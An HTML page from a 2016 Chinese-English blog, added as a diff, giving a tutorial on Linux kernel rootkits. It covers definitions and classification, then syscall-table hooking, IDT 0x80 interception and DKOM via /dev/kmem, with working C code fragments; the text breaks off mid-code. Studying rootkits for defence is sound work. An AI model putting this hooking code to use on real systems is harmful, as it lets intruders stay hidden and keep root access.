@@ -1,0 +1,881 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css"/>
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Security,Attack,Rootkit,Malware,Kernel," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Diting0x" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/avatar.jpg?v=5.0.1" />
+
+
+
+
+
+
+<meta name="description" content="0x1: Definition of rootkit 
+0x2: Classification of Rootkit
+0x3: Hooking(Kernel Object Hooking) Rootkit
+0x4: DKOM Rootkit
+0x5: Rootkit Objectives
+0x6: Example-Module Hiding
+0x7: Example-Process Hidin">
+<meta property="og:type" content="article">
+<meta property="og:title" content="A Comprehensive Tutorial of Rootkit">
+<meta property="og:url" content="http://yoursite.com/blog/2016/03/08/rootkit-tutorial/index.html">
+<meta property="og:site_name" content="Diting0x">
+<meta property="og:description" content="0x1: Definition of rootkit 
+0x2: Classification of Rootkit
+0x3: Hooking(Kernel Object Hooking) Rootkit
+0x4: DKOM Rootkit
+0x5: Rootkit Objectives
+0x6: Example-Module Hiding
+0x7: Example-Process Hidin">
+<meta property="og:updated_time" content="2016-07-18T16:19:06.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="A Comprehensive Tutorial of Rootkit">
+<meta name="twitter:description" content="0x1: Definition of rootkit 
+0x2: Classification of Rootkit
+0x3: Hooking(Kernel Object Hooking) Rootkit
+0x4: DKOM Rootkit
+0x5: Rootkit Objectives
+0x6: Example-Module Hiding
+0x7: Example-Process Hidin">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"hide"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 0,
+      author: '博主'
+    }
+  };
+</script>
+
+  <title> A Comprehensive Tutorial of Rootkit | Diting0x </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+  <div style="display: none;">
+    <script src="http://s6.cnzz.com/stat.php?id=1257556336&web_id=1257556336" type="text/javascript"></script>
+  </div>
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">Diting0x</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle">Keep Me Alive</p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-home fa-fw"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-archive fa-fw"></i> <br />
+            
+            技术
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-life">
+          <a href="/life" rel="section">
+            
+              <i class="menu-item-icon fa fa-question-circle fa-fw"></i> <br />
+            
+            生活
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-th fa-fw"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-user fa-fw"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-tags fa-fw"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-commonweal">
+          <a href="/404.html" rel="section">
+            
+              <i class="menu-item-icon fa fa-heartbeat fa-fw"></i> <br />
+            
+            公益404
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                A Comprehensive Tutorial of Rootkit
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-03-08T10:25:37+08:00" content="2016-03-08">
+              2016-03-08
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/rootkit/" itemprop="url" rel="index">
+                    <span itemprop="name">rootkit</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/blog/2016/03/08/rootkit-tutorial/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="blog/2016/03/08/rootkit-tutorial/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <blockquote>
+<ul>
+<li>0x1: Definition of rootkit </li>
+<li>0x2: Classification of Rootkit</li>
+<li>0x3: Hooking(Kernel Object Hooking) Rootkit</li>
+<li>0x4: DKOM Rootkit</li>
+<li>0x5: Rootkit Objectives</li>
+<li>0x6: Example-Module Hiding</li>
+<li>0x7: Example-Process Hiding</li>
+<li>0x8: Rootkit Samples</li>
+<li>0x9: Rootkit Resources</li>
+<li>0xA: Acknowledgement</li>
+</ul>
+</blockquote>
+<a id="more"></a>
+<h3 id="0x1-Definition-of-rootkit"><a href="#0x1-Definition-of-rootkit" class="headerlink" title="0x1: Definition of rootkit"></a>0x1: Definition of rootkit</h3><p>The term <em>rootkit</em> originates from the composition of the individual terms root, referring to the highest privilege of access that can be obtained in a traditional Unix-based operating system, and <em>kit</em>, referring to a set of programs that are designed to exploit a target system, gain root access and then maintain it without tripping any alarms. </p>
+<p>简而言之，rootkit是攻击者向计算机系统中植入的，能够隐藏自身踪迹并保留超级用户权限的恶意程序。与worms，virus不同的是，rootkit基于攻击者已经拿到root权限之后对系统进行破坏。rootkit会尽可能通过隐藏文件、进程、模块、进程等信息避免被监控程序检测。</p>
+<h3 id="0x2-Classification-of-Rootkit"><a href="#0x2-Classification-of-Rootkit" class="headerlink" title="0x2: Classification of Rootkit"></a>0x2: Classification of Rootkit</h3><p>早期的rootkit主要为应用级rootkit，应用级rootkit主要通过替换login、ps、ls、netstat等系统工具,或者修改一些系统配置文件、脚本来实现隐藏及后门. 然而应用层rootkit比较容易检测，比如基于ring 3的chkrootkit检测工具。后期逐渐演变成内核rootkit,hypervisor rootkit以及硬件级rootkit. 内核rootkit可分为hooking rootkit以及DKOM rootkit。 下面就先来具体介绍这两种kernel rootkit。 hypervisor以及硬件级rootkit本文不做具体介绍，想了解更详细的rootkit分类，可参考这篇文章：<a href="http://blog.invisiblethings.org/papers/2006/rutkowska_malware_taxonomy.pdf" target="_blank" rel="external">Introducing Stealth Malware Taxonomy
+</a></p>
+<h3 id="0x3-Hooking-Kernel-Object-Hooking-Rootkit"><a href="#0x3-Hooking-Kernel-Object-Hooking-Rootkit" class="headerlink" title="0x3: Hooking(Kernel Object Hooking) Rootkit"></a>0x3: Hooking(Kernel Object Hooking) Rootkit</h3><p>Hooking rootkit 主要基于lkm(loadable kernel module)技术，以可加载内核模块的形式通过系统提供的接口加载到内核空间，成为内核的一部分，进而通过hook系统调用等技术实现隐藏、后门功能，这时，rootkit便是内核的一个模块。</p>
+<p>注：lkm is an object file that contains code to extend the running kernel, or so-called base kernel, of an operating system. lkm中文名为可加载内核模块，主要作用是用来扩展linux的内核功能。lkm的优点在于可以动态地加载到内存中，无须重新编译内核, 所以它经常被用于一些设备的驱动程序，例如声卡，网卡等等。当然因为其优点，也经常被骇客用于rootkit技术当中。关于lkm更多的知识，可参考<a href="https://www.thc.org/papers/LKM_HACKING.html" target="_blank" rel="external">Complete Linux Loadable Kernel Modules</a>, 文章中也有与系统调用劫持相关的代码分析，下文会继续提到。lkm只是hooking rootkit的存在形式，而真正的技术在于如何hooking. </p>
+<p>什么是hooking ? 来自wekipedia的解释： the term hooking covers a range of techniques used to alter or augment the behavior of an operating system, of applications, or of other software components by intercepting function calls or messages or events passed between software components. Code that handles such intercepted function calls, events or messages is called a “hook”.  假如正常执行的情况是 Funtion A -&gt; Funtion B, 经过hooking之后的执行就变为 Funtion A -&gt; Hook -&gt; Funtion B. </p>
+<p>Hooking rootkit主要的hook对象是系统调用，也包括VFS函数劫持(如adore-ng),下文会提到。当应用程序发起系统调用(比如 open()打开文件)时，整个程序控制流就像这样：</p>
+<p>1). 触发中断，然后程序在中断处理器（interrupt handler)定义的中断中继续执行。在Linux上，INT 80指令用来触发中断。</p>
+<p>这时，rootkit可以用自己的函数替换内核的中断处理器。这需要修改IDT(Interrupt Descriptor Table). 具体修改代码下文还会继续提到。 </p>
+<p>2). 中断处理器在syscall table中查询被请求的syscall的地址，将执行跳转到该地址中。</p>
+<p> a 这时，rootkit可以修改中断处理器而使用另一个syscall table, 这种类型的rootkit相对较少，可参考 Suckit， 文章<a href="http://phrack.org/archives/issues/58/7.txt" target="_blank" rel="external">Phrack issue 58, article 0x07 (“Linux on-the-fly kernel patching without LKM”</a>有具体描述.<br>这种方式属于DKOM rootkit, 下文会详细讲解。</p>
+<p> b 也可以只修改syscall table的入口地址，将其替换为rootkit自己的函数. 大部分的rootkit都采取这种方式，如adore-ng, knark, synapsis等。</p>
+<p>3). 执行系统调用函数， 控制权返回到应用程序。<br>这时，rootkit也可以重写系统调用函数，在函数起始处放置jump，跳转到自己的函数中。</p>
+<p>但很少有rootkit采用这种方法。</p>
+<p>对于2).b 类型的rootkit， 可参考以下代码</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MODULE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __KERNEL__</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">void</span>* sys_call_table[];       <span class="comment">/*sys_call_table is exported, so we</span><br><span class="line">                                     can access it*/</span>               </span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> (*orig_mkdir)(<span class="keyword">const</span> <span class="keyword">char</span> *path); <span class="comment">/*the original systemcall*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hacked_mkdir</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path)</span></span><br><span class="line"></span>&#123;</span><br><span class="line"> return <span class="number">0</span>;                           <span class="comment">/*everything is ok, but he new systemcall</span><br><span class="line">                                     does nothing*/</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">init_module</span><span class="params">(<span class="keyword">void</span>)</span>                <span class="comment">/*module setup*/</span></span><br><span class="line"></span>&#123;</span><br><span class="line"> orig_mkdir=sys_call_table[SYS_mkdir];</span><br><span class="line"> sys_call_table[SYS_mkdir]=hacked_mkdir;</span><br><span class="line"> return <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cleanup_module</span><span class="params">(<span class="keyword">void</span>)</span>            <span class="comment">/*module shutdown*/</span></span><br><span class="line"></span>&#123;</span><br><span class="line"> sys_call_table[SYS_mkdir]=orig_mkdir; <span class="comment">/*set mkdir syscall to the origal</span><br><span class="line">                                       one*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>注意，要对系统调用(sys_call_table)进行替换，却必须要获取该地址后才可以进行替换。但是Linux 2.6版的内核出于安全的考虑没有将系统调用列表基地址的符号sys_call_table导出，但是我们可以采取一些hacking的方式进行获取。<br>因为系统调用都是通过0x80中断来进行的，故可以通过查找0x80中断的处理程序来获得sys_call_table的地址。其基本步骤是：</p>
+<ol>
+<li>获取中断描述符表(IDT)的地址(使用C ASM汇编)</li>
+<li>从中查找0x80中断(系统调用中断)的服务例程(8*0x80偏移)</li>
+<li>搜索该例程的内存空间，</li>
+<li>从其中获取sys_call_table(保存所有系统调用例程的入口地址)的地址</li>
+</ol>
+<p>有关获取IDT表地址的代码：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">unsigned long get_addr_idt (void)</span><br><span class="line">        &#123;</span><br><span class="line">         unsigned char idtr[6];</span><br><span class="line">         unsigned long idt;</span><br><span class="line">        __asm__ volatile ("sidt %0": "=m" (idtr));</span><br><span class="line">        idt = *((unsigned long *) &amp;idtr[2]);</span><br><span class="line">        return(idt);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<p>获取syscall table地址的方法还有许多，更多可参考 <a href="http://www.cnblogs.com/LittleHann/p/3854977.html" target="_blank" rel="external">Linux System Calls Hooking Method Summary</a>。</p>
+<p>对于 1)类型的rootkit相当于将系统调用的hook转移到了 对80中断的hook，具体可参考 <a href="http://www.cnblogs.com/LittleHann/p/3910696.html" target="_blank" rel="external">Rootkit Hacking Technology &amp;&amp; Defence Strategy Research</a><br>以及<br><a href="http://www.phrack.org/archives/issues/59/4.txt" target="_blank" rel="external">Phrack issue 59, article 0x04 (“Handling the Interrupt Descriptor Table”</a></p>
+<p>相关代码如下：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">/*</span><br><span class="line">1. 通过"中断寄存器"获取中断描述符表(IDT)的地址(使用C ASM汇编)</span><br><span class="line">*/</span><br><span class="line">asm("sidt %0":"=m"(idt48));</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">2. 从中查找0x80中断("0x80中断"就是"系统调用中断")的服务例程(8*0x80偏移)</span><br><span class="line">"中断描述符表(IDT)"中有很多项，每项8个字节，而第0x80项才是系统调用对应的中断</span><br><span class="line">struct descriptor_idt</span><br><span class="line">&#123;</span><br><span class="line">        unsigned short offset_low;</span><br><span class="line">        unsigned short ignore1;</span><br><span class="line">        unsigned short ignore2;</span><br><span class="line">        unsigned short offset_high;</span><br><span class="line">&#125;;</span><br><span class="line">static struct </span><br><span class="line">&#123;</span><br><span class="line">        unsigned short limit;</span><br><span class="line">        unsigned long base;</span><br><span class="line">&#125;__attribute__ ((packed)) idt48;</span><br><span class="line">*/</span><br><span class="line">pIdt80 = (struct descriptor_idt *)(idt48.base + 8*0x80);</span><br><span class="line">system_call_addr = (pIdt80-&gt;offset_high &lt;&lt; 16 | pIdt80-&gt;offset_low);</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">3. 搜索该例程的内存空间，获取"系统调用函数表"的地址("系统调用函数表"根据系统调用号作为索引保存了linux系统下的所有系统调用的入口地址)</span><br><span class="line">*/</span><br><span class="line">for (i=0; i&lt;100; i++)</span><br><span class="line">&#123;</span><br><span class="line">    if (p=='\xff' &amp;&amp; p[i+1]=='\x14' &amp;&amp; p[i+2]=='\x85')</span><br><span class="line">    &#123;</span><br><span class="line">        sys_call_table = *(unsigned int*)(p+i+3);</span><br><span class="line">        printk("addr of sys_call_table: %x\n", sys_call_table);</span><br><span class="line">        return ;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">4. 将sys_call_table作为基址，根据系统调用号作为索引，获取指定的系统调用的函数地址指针，因为我们通过劫持80中断进而达到系统调用劫持的目的后，还需要将代码控制流重新导向原始的系统调用</span><br><span class="line">*/</span><br><span class="line">orig_read = sys_call_table[__NR_read]; </span><br><span class="line">orig_getdents64 = sys_call_table[__NR_getdents64];</span><br><span class="line">..</span><br><span class="line">replace</span><br><span class="line">..</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">5. 直接替换IDT中的某一项，也就是我们需要通过代码模拟原本"系统调用中断例程(IDT[0x80])"的代码逻辑</span><br><span class="line">*/</span><br><span class="line">void new_idt(void)</span><br><span class="line">&#123;</span><br><span class="line">        ASMIDType</span><br><span class="line">        (</span><br><span class="line">                "cmp %0, %%eax      \n"</span><br><span class="line">                "jae syscallmala        \n"</span><br><span class="line">                "jmp hook               \n"</span><br><span class="line"></span><br><span class="line">                "syscallmala:           \n"</span><br><span class="line">                "jmp dire_exit          \n"</span><br><span class="line"></span><br><span class="line">                : : "i" (NR_syscalls)</span><br><span class="line">        );</span><br><span class="line">&#125;</span><br><span class="line">..</span><br><span class="line">void hook(void)</span><br><span class="line">&#123;</span><br><span class="line">    register int eax asm("eax");</span><br><span class="line"></span><br><span class="line">    switch(eax)</span><br><span class="line">    &#123;</span><br><span class="line">        case __NR_getdents64:</span><br><span class="line">            CallHookedSyscall(Sys_getdents64);</span><br><span class="line">            break;</span><br><span class="line">        case __NR_read:</span><br><span class="line">            CallHookedSyscall(Sys_read);</span><br><span class="line">               break; </span><br><span class="line">        default:</span><br><span class="line">            JmPushRet(dire_call);</span><br><span class="line">           break;</span><br><span class="line">    &#125; </span><br><span class="line">    //jmp to original syscall idt handler </span><br><span class="line">    JmPushRet( after_call );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="0X4-DKOM-Rootkit"><a href="#0X4-DKOM-Rootkit" class="headerlink" title="0X4: DKOM Rootkit"></a>0X4: DKOM Rootkit</h3><p>DKOM means direct kernel object manipulation-直接内核对象操作。所有的操作系统(linux、windows)都会把内核中的运行状态(包括进程信息、系统内核状态)这些数据以对象的形式保存下来，包括:结构体、队列与数组。这些内核状态信息往往保存在内核空间的某个地址段中，当我们通过系统向内核查询这些”内核状态信息”(运行进程的列表、开放的端口等)时，这些数据就被解析并返回。因为这些数据是保存在内存中的，所以可以直接去操作它们。 其主要利用/dev/kmem技术。</p>
+<p>什么是/dev/kmem? 指的是kernel看到的虚拟内存的全镜像。可以用来访问kernel的内容，查看kernel的变量，也是DKOM rootkit的目标对象。注意还有个设备叫做/dev/mem,这是物理内存的全镜像，可以用来访问物理内存。</p>
+<p>以下是DKOM rootkit利用/dev/kmem来获取syscall table地址的代码：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">short</span> limit;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> base;</span><br><span class="line">&#125; __attribute__ ((packed)) idtr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">short</span> off1;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">short</span> sel;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> none,flags;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">short</span> off2;</span><br><span class="line">&#125; __attribute__ ((packed)) idt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> kmem;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">readkmem</span> <span class="params">(<span class="keyword">void</span> *m,<span class="keyword">unsigned</span> off,<span class="keyword">int</span> sz)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (lseek(kmem,off,SEEK_SET)!=off) &#123;</span><br><span class="line">                perror(<span class="string">"kmem lseek"</span>); <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (read(kmem,m,sz)!=sz) &#123;</span><br><span class="line">                perror(<span class="string">"kmem read"</span>); <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CALLOFF 100     <span class="comment">/* we'll read first 100 bytes of int $0x80*/</span></span></span><br><span class="line">main ()</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">unsigned</span> sys_call_off;</span><br><span class="line">        <span class="keyword">unsigned</span> sct;</span><br><span class="line">        <span class="keyword">char</span> sc_asm[CALLOFF],*p;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* well let's read IDTR */</span></span><br><span class="line">        <span class="keyword">asm</span> (<span class="string">"sidt %0"</span> : <span class="string">"=m"</span> (idtr));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"idtr base at 0x%X\n"</span>,(int)idtr.base);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* now we will open kmem */</span></span><br><span class="line">        kmem = open (<span class="string">"/dev/kmem"</span>,O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span> (kmem&lt;<span class="number">0</span>) return <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* read-in IDT for 0x80 vector (syscall) */</span></span><br><span class="line">        readkmem (&amp;idt,idtr.base+<span class="number">8</span>*<span class="number">0x80</span>,<span class="keyword">sizeof</span>(idt));</span><br><span class="line">        sys_call_off = (idt.off2 &lt;&lt; <span class="number">16</span>) | idt.off1;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"idt80: flags=%X sel=%X off=%X\n"</span>,</span><br><span class="line">                (unsigned)idt.flags,(unsigned)idt.sel,sys_call_off);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* we have syscall routine address now, look for syscall table</span><br><span class="line">           dispatch 